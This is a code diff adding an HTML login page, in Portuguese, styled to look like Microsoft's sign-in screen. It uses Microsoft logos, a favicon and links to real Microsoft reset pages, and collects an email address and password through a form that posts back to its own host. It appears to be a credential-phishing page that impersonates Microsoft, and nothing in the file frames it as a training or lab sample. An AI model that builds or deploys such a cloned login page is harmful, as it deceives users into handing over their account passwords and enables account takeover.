@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+<html>
+<head>
+<title>Entre na sua conta</title>
+<link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+</head>
+<body>
+    <div id="overlay" class="overlay"></div>
+    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
+    <div class="outer">
+        <div class="middle">
+            <form action="" class="ui large form" id="loginForm" method="post" onsubmit="(removeMascara() &amp; removeEspecial());">
+                <div class="sign-in-box">
+                    <div class="win-scroll">
+                        <img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+                        <div class="prompt">
+                            Entrar
+                        </div>
+                        <div id="error">
+                            Please enter the password for your Microsoft account.
+                        </div>
+                        <input class="passwordinput" id="username" name="user" type="email" autocomplete="off" placeholder="Email, telefone ou Skype" required>
+                        <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Senha" required>
+                    </div>
+                    <p><span style="font-size: .8125rem;">Não consegue acessar sua conta?</span> <a href="https://account.live.com/ResetPassword.aspx">Opções de Entrada</a></p>
+                    <p><a href="https://account.live.com/ResetPassword.aspx">Mais Informações</a></p>
+                    <div class="buttoncontainer">
+                    <input type="submit" id="submit" class="button" value="Avançar" >
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+<style>
+body {
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+    line-height: 20px;
+    font-weight: 400;
+    font-size: .9375rem;
+    line-height: 1.25rem;
+    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIgY3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
+    background-size: cover;
+    margin: 0;
+}
+a {
+    color: #0067b8;
+    text-decoration: none;
+    font-size: .8125rem;
+}
+.overlay {
+    background-color: #101010;
+    opacity: .1;
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    width: 100vw;
+    z-index: 0;
+}
+.footer {
+    background-color: rgba(20,20,20, 0.6);
+    position: fixed;
+    bottom: 0;
+    height: 28px;
+    width: 100vw;
+    z-index: 0;
+}
+.footertext {
+    position: fixed;
+    right: 0;
+    text-align: right;
+    color: #fff;
+    font-size: 12px;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    margin-left: 8px;
+    margin-right: 50px;
+}
+.outer {
+    display: table;
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    z-index: 10;
+}
+.middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+.sign-in-box {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 400px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    min-width: 300px;
+    min-height: 300px;
+    overflow: hidden;
+}
+
+.win-scroll {
+    box-sizing: border-box;
+}
+.logo {
+    margin-bottom: 10px;
+    box-sizing: border-box;
+}
+.logo_image {
+    height: 40px;
+}
+.display_name {
+    line-height: 24px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    margin-bottom: 15px;
+}
+.prompt {
+    color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 15px;
+}
+#error {
+    color: red;
+    display: none;
+}
+.passwordinput {
+    padding: 2px 8px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: rgba(0,0,0,.4);
+    background-color: rgba(255,255,255,.4);
+    height: 32px;
+    height: 2rem;
+    padding: 6px 10px;
+    padding-left: 10px;
+    border-width: 1px;
+    border-top-width: 1px;
+    border-right-width: 1px;
+    border-left-width: 1px;
+    border-color: #666;
+    border-color: rgba(0,0,0,.6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    background-color: transparent;
+    border-top-width: 0;
+    border-left-width: 0;
+    border-right-width: 0;
+    padding-left: 0;
+    display: block;
+    width: 90%;
+    margin-bottom: 15px;
+}
+.buttoncontainer {
+    position: absolute;
+    bottom: 72px;
+    right: 50px;
+    text-align: right;
+    width: 100%;
+}
+.button {
+    color: #fff;
+    border-color: #0067b8;
+    background-color: #0067b8;
+    display: block;
+    width: 120px;
+    position: absolute;
+    right: 0px;
+    padding: 5px 14px 6px 14px;
+}
+.button:hover {
+    border-color: #0055a6;
+    background-color: #0055a6;
+}
+</style>
+</html>
